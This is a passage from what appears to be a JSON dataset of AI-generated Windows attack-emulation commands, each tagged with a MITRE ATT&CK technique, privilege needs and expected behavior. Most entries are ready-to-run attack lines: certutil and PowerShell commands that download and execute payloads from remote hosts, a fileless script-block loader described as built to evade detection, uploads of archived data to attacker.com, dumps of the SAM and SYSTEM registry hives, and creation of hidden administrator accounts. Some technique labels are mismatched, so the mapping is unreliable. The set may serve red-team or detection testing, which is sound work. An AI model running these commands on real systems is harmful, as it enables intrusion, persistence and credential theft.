      "description": "Use PowerShell WebClient to retrieve data from a remote server with custom headers, mimicking stealthy payload retrieval.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download data using PowerShell WebClient with a spoofed User-Agent. Output saved to a file in TEMP. Errors are suppressed. Uses only built-in .NET classes and avoids modern cmdlets like Invoke-WebRequest.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:50.589944",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "95d1e96f-49d8-4b33-addf-473f5479be12",
      "ttp_id": "unknown",
      "technique_id": "T1053.002",
      "technique_name": "Scheduled Task",
      "tactic": "execution",
      "platform": "windows",
      "command": "at 13:20 /interactive calc.exe",
      "description": "Schedule a basic interactive task using at.exe to launch calc.exe at 13:20",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The Windows Task Scheduler will execute calc.exe at the specified time. Requires administrator privileges and the Task Scheduler service to be running. Command will fail silently if at.exe is not available or privileges are insufficient.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:51.720188",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6d145c2f-dfd7-49d2-a905-e1bee53eac78",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /create /tn \"UpdateTask\" /tr \"cmd /c powershell -Command \\\"Start-Process notepad.exe\\\"\" /sc once /st 14:30 /ru SYSTEM /f",
      "description": "Create a scheduled task using schtasks.exe to run notepad.exe as SYSTEM at 14:30",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new scheduled task named 'UpdateTask' is created and set to run once at 14:30 as the SYSTEM account. The task uses cmd to invoke a PowerShell command that starts notepad.exe. Requires administrator privileges. The /f flag forces creation if the task already exists.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:51.720188",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ef63f757-4079-43e2-a301-fe06c09609bd",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $action = New-ScheduledTaskAction -Execute 'cmd' -Argument '/c certutil.exe -urlcache -split -f http://10.0.0.5/file.bat %TEMP%\\\\debug.bat > nul && call %TEMP%\\\\debug.bat'; $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1); $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 5); Register-ScheduledTask -TaskName 'DiagTask' -Action $action -Trigger $trigger -User 'NT AUTHORITY\\\\SYSTEM' -RunLevel Highest -Settings $settings -Force } catch { }\"",
      "description": "Register a scheduled task via PowerShell that downloads and executes a script from a remote server after one minute",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a scheduled task named 'DiagTask' set to run once after one minute with SYSTEM privileges. The task downloads a batch file using certutil.exe and executes it. Uses built-in Windows tools and mimics common malware behavior. Requires admin rights due to SYSTEM-level task creation. The command suppresses errors to avoid detection in logs.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:51.720188",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d77dd034-4758-4e12-a84c-0d7abd9dead1",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100:8080/msf_payload.exe %TEMP%\\\\msf.exe && %TEMP%\\\\msf.exe",
      "description": "Download and execute a Metasploit payload using certutil, a built-in Windows binary commonly abused for client-side exploitation.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads executable from local attacker-controlled server and runs it from %TEMP%. Leaves disk artifacts and generates network beaconing behavior typical of initial access payloads.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:52.877117",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ceee6f52-0ce7-4c9f-89fd-f398d9bc9dac",
      "ttp_id": "unknown",
      "technique_id": "T1202",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IWR -Uri http://192.168.1.100:8080/sc.xml -OutFile %TEMP%\\\\sc.xml; regsvr32 /s /n /u /i:%TEMP%\\\\sc.xml scrobj.dll\"",
      "description": "Use PowerShell to download a remote SCT (Scriptlet) file and execute it via regsvr32.exe, simulating client exploitation through trusted binary proxy execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads SCT file silently and executes code via regsvr32, a legitimate Windows binary. This technique bypasses application whitelisting and is commonly used in client exploitation scenarios.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:52.877117",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c3387383-38f9-4968-88fb-b3469639b5a7",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Calc.exe')) | Out-File %TEMP%\\\\cmd.b64\" && powershell -EncodedCommand (Get-Content %TEMP%\\\\cmd.b64 -ErrorAction SilentlyContinue)",
      "description": "Encode a benign command (launch calc.exe) using UTF-16LE encoding and execute via PowerShell -EncodedCommand to simulate obfuscated payload delivery.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Generates a Base64-encoded UTF-16LE string of 'Calc.exe', saves to file, then reads and executes it. Mimics encoded command execution seen in Metasploit-generated payloads without using malicious content.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:52.877117",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1f7d0e68-941b-40f9-98c1-44e38e637911",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100:8080/stage1.bin %TEMP%\\\\stage1.bin",
      "description": "Download payload using certutil, a built-in Windows binary often abused for C2 communication.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a specified HTTP endpoint and saves it to the user's TEMP directory. Will fail silently if network is unreachable or server is down.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:54.161307",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f4eab76f-a9d8-49a9-b3b6-3270ccf7bcbc",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://192.168.1.100:8080/config' -OutFile '%TEMP%\\\\config.dat' -ErrorAction SilentlyContinue\"",
      "description": "Use PowerShell to retrieve configuration data over HTTP, simulating beacon-like C2 behavior.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends an HTTP GET request to a local C2 server and saves the response to a temporary file. Uses error action preference to avoid crashing if request fails.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:54.161307",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "254a74b3-59e0-40ad-883e-bb92a0586f09",
      "ttp_id": "unknown",
      "technique_id": "T1087.001",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process net.exe -ArgumentList 'user' -WindowStyle Hidden -ErrorAction SilentlyContinue\"",
      "description": "Execute 'net user' via PowerShell to discover local accounts, mimicking post-compromise discovery behavior over C2.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Spawns a hidden process running 'net user' to list local user accounts. This is a common discovery technique relayed through C2 channels.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:54.161307",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "41c57cd2-bff4-4b9a-8d6d-a4a41e83462f",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c whoami.exe /all > \"%TEMP%\\\\user_info.txt\" 2>&1",
      "description": "Basic user enumeration using built-in Windows command to list current user privileges and group memberships, output redirected to a temporary file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes whoami with detailed user information, writes output to a file in the user's temporary directory. No elevated privileges required. Harmless information gathering.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:55.072956",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5600c098-7c9b-4c91-ae48-b0903de2052a",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c certutil.exe -urlcache -split -f http://192.168.1.100/shell.exe \"%TEMP%\\\\update.exe\" && \"%TEMP%\\\\update.exe\"",
      "description": "Intermediate stage: download and execute a binary from a local C2 server using certutil, a built-in Windows utility commonly abused for file downloads.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download an executable from a local IP address using certutil, saves it to the temp directory, and executes it. Will fail without network access, but demonstrates common living-off-the-land technique.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:55.072956",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "08b2df97-2e7b-49bc-a969-2a9a52ffdae2",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $wc = New-Object Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0'); $data = $wc.DownloadData('http://192.168.1.100/script.txt'); $decoded = [Text.Encoding]::UTF8.GetString($data); $exec = [ScriptBlock]::Create($decoded); . $exec } catch { }\"",
      "description": "Advanced: download and execute a PowerShell script block from a remote server with error suppression, using .NET WebClient to avoid direct Invoke-WebRequest usage.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Uses .NET WebClient to fetch a remote script, decodes it, and executes in the current scope. No logging or output. Designed to evade basic command-line detection. Requires PowerShell but no admin rights.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:55.072956",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "fb3b138f-fe6b-4ec8-b925-fbdcd51a1d2f",
      "ttp_id": "unknown",
      "technique_id": "T1048.002",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -encode %TEMP%\\\\sensitive_data.txt %TEMP%\\\\exfil.b64 && powershell -Command \"(New-Object Net.WebClient).UploadFile('http://192.168.1.100/upload', 'POST', '%TEMP%\\\\exfil.b64')\"",
      "description": "Encode a file using certutil and exfiltrate via WebClient in PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Encodes a local file into Base64 using certutil, then uploads it to a remote server via HTTP POST using .NET WebClient. Leaves behind temporary encoded file.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:56.029481",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "eaac2141-2b1c-468b-a019-7863fecc5f07",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\\\logs\\* -DestinationPath %TEMP%\\\\archive.zip -Force; (New-Object Net.WebClient).UploadFile('https://attacker.com/exfil', 'PUT', '%TEMP%\\\\archive.zip') -ErrorAction SilentlyContinue\"",
      "description": "Archive collected data and exfiltrate over HTTPS using WebClient",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Compresses files from a local directory into a ZIP archive, then uploads it to a remote server via PUT request. Uses -Force to overwrite existing archive and -ErrorAction to suppress upload errors.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:56.029481",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "31c5c85c-a404-4d9b-a3e2-6df4a69bcae0",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& cmd /c 'set > %TEMP%\\\\env.txt' ; certutil.exe -urlcache -split -f http://192.168.1.100/exe payload.exe 2>&1 > nul ; start /b %TEMP%\\\\payload.exe\"",
      "description": "Capture environment variables and download payload via certutil for execution",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Dumps current environment variables to a file, downloads an executable from a remote server using certutil, and executes it silently. Simulates data gathering and C2 communication using common Windows tools.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:56.029481",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2f726d79-0a08-4e33-ae05-9b64ce5c0318",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/exploit.exe %TEMP%\\\\exploit.exe && %TEMP%\\\\exploit.exe",
      "description": "Download and execute a payload from a remote server using certutil, a built-in Windows binary commonly abused for file transfer.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download a file from the specified URL and executes it from the TEMP directory. Network connection required to the attacker-controlled server.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:56.857032",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8d63dbf8-30a9-4da3-9780-43119c020bed",
      "ttp_id": "unknown",
      "technique_id": "T1136",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process net.exe -ArgumentList 'user hacker Password123 /add' -Verb RunAs\"",
      "description": "Create a new local user account using net.exe via PowerShell with elevation prompt.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Prompts for administrator privileges and creates a new local user 'hacker' with the specified password. Visible UAC prompt if not already elevated.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:56.857032",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5948b747-6c62-4ec7-8093-6bf722d99e2f",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\\\data.txt -DestinationPath %TEMP%\\\\archive.zip -Force -ErrorAction SilentlyContinue\"",
      "description": "Archive a sensitive file before exfiltration using built-in PowerShell Compress-Archive cmdlet.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a ZIP archive of data.txt in the TEMP directory. Uses Force to overwrite existing archive and suppresses errors if cleanup fails.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:56.857032",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d6b69573-199c-4142-964e-eb2bcfbef3d3",
      "ttp_id": "unknown",
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic process call create \"cmd.exe /c echo Test > %TEMP%\\\\wmi_test.txt\"",
      "description": "Create a new process via WMI to execute a command that writes a test file to the temp directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new process is spawned via WMI to execute cmd.exe, which creates a file named wmi_test.txt in the user's temp directory with the content 'Test'",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:57.796886",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a9dcfbce-2151-43c5-b742-128ffe8410f2",
      "ttp_id": "unknown",
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c net user wmiuser P@ssw0rd123! /add && net localgroup administrators wmiuser /add'\"",
      "description": "Use PowerShell WMI cmdlet to create a new process that adds a new user and adds them to the local administrators group",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A new process is created via WMI that executes commands to add a user 'wmiuser' with password 'P@ssw0rd123!' and adds the user to the local administrators group. This simulates privilege escalation and persistence",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:57.796886",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9200d5cd-6623-4a69-938f-418c98fecd9f",
      "ttp_id": "unknown",
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic /node:\"192.168.1.100\" process call create \"cmd.exe /c whoami > \\\\192.168.1.101\\share\\enum.txt\"",
      "description": "Remotely execute a command on a target system via WMI to run whoami and output result to a network share",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Connects to the remote system at 192.168.1.100 using WMI, spawns a process to run 'whoami', and writes the output to a file on a specified network share. Simulates lateral movement and remote command execution",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:57.796886",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "73350361-f77b-4a84-aa75-730b219c6c53",
      "ttp_id": "unknown",
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $secrets = Get-WmiObject -Class Win32_Account | Where-Object { $_.Disabled -eq $false }; $secrets | ConvertTo-Json | Out-File '%TEMP%\\\\creds.json' } catch { }\"",
      "description": "Basic credential dumping using WMI to enumerate active user accounts and export to JSON in temp directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Enumerates local user accounts via WMI and saves the output in JSON format to %TEMP%\\creds.json. Runs without elevated privileges but only retrieves non-disabled accounts.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:58.985513",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "84afcb77-a43c-4b7b-8884-7aa112189b05",
      "ttp_id": "unknown",
      "technique_id": "T1003.002",
      "technique_name": "OS Credential Dumping",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) { $data = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c reg save hklm\\\\sam %TEMP%\\\\sam.save & reg save hklm\\\\system %TEMP%\\\\system.save & reg save hklm\\\\security %TEMP%\\\\security.save' }\"",
      "description": "Intermediate credential dumping via registry hives (SAM, SYSTEM, SECURITY) using built-in reg.exe",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Checks for admin rights, then uses 'reg save' to dump SAM, SYSTEM, and SECURITY registry hives to the temp directory. These files can be used offline for hash extraction. Requires admin privileges.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:58.985513",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9e2903db-378f-4d99-9385-4963dcb9a933",
      "ttp_id": "unknown",
      "technique_id": "T1003.006",
      "technique_name": "OS Credential Dumping",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"echo HKEY_LOCAL_MACHINE\\\\SAM > %TEMP%\\\\keys.txt & echo HKEY_LOCAL_MACHINE\\\\SYSTEM >> %TEMP%\\\\keys.txt & certutil -f -exportPFX @%TEMP%\\\\keys.txt %TEMP%\\\\secrets.pfx testpass 2>&1 > nul || exit 0\"",
      "description": "Advanced attempt to abuse certutil to export registry keys as PFX (unreliable but evasive)",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Attempts to misuse certutil.exe to export SAM and SYSTEM registry hives into a PFX file with password 'testpass'. This is a known living-off-the-land technique, though certutil may fail silently. Requires admin rights and produces minimal logs.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:58.985513",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e893384d-b011-4ed0-b429-e422ac420970",
      "ttp_id": "unknown",
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "net view",
      "description": "Enumerate network shares and computers visible on the domain or workgroup using built-in net.exe command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists available domains, computers, or shared resources on the network. No changes are made to the system.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:59.785494",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c13e5b4b-6aff-4f23-8bf0-21460c71eb85",
      "ttp_id": "unknown",
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name, Domain, PartOfDomain\"",
      "description": "Use WMI via PowerShell to retrieve system and domain membership information for network discovery",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Outputs local system name, domain, and whether it's part of a domain. Uses WMI which may trigger detection.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:59.785494",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f2c945bb-4902-4730-815b-ba1d1853b946",
      "ttp_id": "unknown",
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $services = Get-Service | Where-Object { $_.Status -eq 'Running' }; $webServices = $services | Where-Object { $_.Name -match 'IIS|W3SVC|Apache|nginx' }; if ($webServices) { echo 'Found web services:'; $webServices | Format-List Name, DisplayName } else { echo 'No web services found.' } } catch { Write-Error 'Failed to query services' }\"",
      "description": "Advanced discovery of running web services using PowerShell with error handling",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Checks for running services related to web servers. Outputs findings or a benign message. Includes try/catch for robustness.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:59.785494",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "78ae8628-937a-4429-953f-205964d85d55",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\\\sensitive_data.txt' -DestinationPath '%TEMP%\\\\archive.zip' -Force -ErrorAction SilentlyContinue\"",
      "description": "Archives a collected data file using PowerShell's built-in Compress-Archive cmdlet.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a ZIP archive at %TEMP%\\archive.zip containing sensitive_data.txt if it exists; runs silently even if file is missing or locked.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:00.742532",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b4e7d2d5-68ea-4de7-b99a-40f30d8b3844",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "tar -a -c -f %TEMP%\\\\exfil_data.zip -C %TEMP% collected_folder",
      "description": "Uses Windows built-in tar utility (available on Windows 10+ and Server 2019+) to create a compressed ZIP archive of a folder.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates exfil_data.zip in %TEMP% containing collected_folder; fails silently if folder does not exist.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:00.742532",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "90e35edc-42ba-4c79-899e-1edc4ed377aa",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $content = Get-Content '%TEMP%\\\\logs.txt'; $content += (Get-Date).ToString() + ': Archive operation completed'; $content | Set-Content '%TEMP%\\\\logs.txt' -Force } catch {}; Compress-Archive -Path '%TEMP%\\\\*.txt' -DestinationPath '%TEMP%\\\\data_bundle.zip' -Force -ErrorAction SilentlyContinue\"",
      "description": "Advanced command that appends a timestamp to a log file and archives all text files in %TEMP% using Compress-Archive.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Updates logs.txt with a completion timestamp and creates data_bundle.zip containing all .txt files in %TEMP%; handles errors silently.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:00.742532",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9e65d3b2-7f22-4c5c-81f5-bcd5b1db6704",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks.exe /create /tn \"UpdateTask\" /tr \"cmd.exe /c echo Running > %TEMP%\\update.log\" /sc hourly /ru SYSTEM",
      "description": "Creates a scheduled task using schtasks.exe to run a benign command hourly as SYSTEM, simulating persistence via scheduled task.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task named 'UpdateTask' is created and will execute hourly, writing to a log file in %TEMP%. Requires elevated privileges to run as SYSTEM.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:01.681675",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3e5d91cc-41ed-4448-bf22-67e043553541",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks.exe /create /tn \"DataSync\" /tr \"powershell -Command \\\"Write-Output 'Syncing' >> '%TEMP%\\sync.txt'\\\"\" /sc onlogon /ru Users",
      "description": "Creates a scheduled task that runs a PowerShell command on user logon, appending to a file in %TEMP%.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A scheduled task named 'DataSync' is created to run at user logon, appending 'Syncing' to sync.txt in %TEMP%. Runs under user context, no admin required.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:01.681675",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d9c4e592-b524-4474-affe-b6adafc3626f",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& schtasks.exe /create /tn 'MalNet' /tr 'cmd.exe /c certutil.exe -urlcache -split -f http://10.0.0.100/mal.exe %TEMP%\\\\mal.exe && start %TEMP%\\\\mal.exe' /sc once /st 00:00 /f\"",
      "description": "Creates a one-time scheduled task using PowerShell to execute a command that downloads and runs a file via certutil.exe, simulating payload staging.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "A scheduled task named 'MalNet' is created to run once at midnight, using certutil to download a file (simulated) and execute it. Uses built-in tools; no actual payload is fetched.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:01.681675",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7a991fc1-112b-4fdf-82be-ce634fd32538",
      "ttp_id": "unknown",
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "net user",
      "description": "Enumerate local user accounts using the built-in net.exe utility",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists all local user accounts on the system. This is a common first step in account discovery during post-compromise reconnaissance.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:02.598710",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "94d4fb5a-8856-44e6-b7c8-567dcc2d3325",
      "ttp_id": "unknown",
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery",
      "tactic": "execution",
      "platform": "windows",
